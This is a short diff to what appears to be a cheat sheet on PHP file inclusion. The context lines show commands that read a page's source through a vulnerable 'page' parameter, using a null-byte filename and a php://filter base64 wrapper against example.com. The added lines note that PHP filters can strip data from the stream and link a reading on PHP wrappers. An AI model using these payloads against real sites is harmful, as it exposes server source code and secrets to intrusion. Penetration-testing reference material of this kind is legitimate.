@@ -143,6 +143,8 @@ NOTE: Wrappers can be chained multiple times using `|` or `/`:
 ./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
 curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
 ```
+Note: we can delete some code by using PHP filter. (PHP filter is awesome :D) convert.base64-decode and string.strip_tags filters can delete data from the stream.
+Read more: `https://www.ptsecurity.com/upload/corporate/ru-ru/webinars/ics/%D0%90.%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B8%D0%BD_%D0%9E_%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF_%D0%B8%D1%81%D0%BF_%D0%A0%D0%9D%D0%A0_wrappers.pdf`
 
 ### Wrapper zip://
 
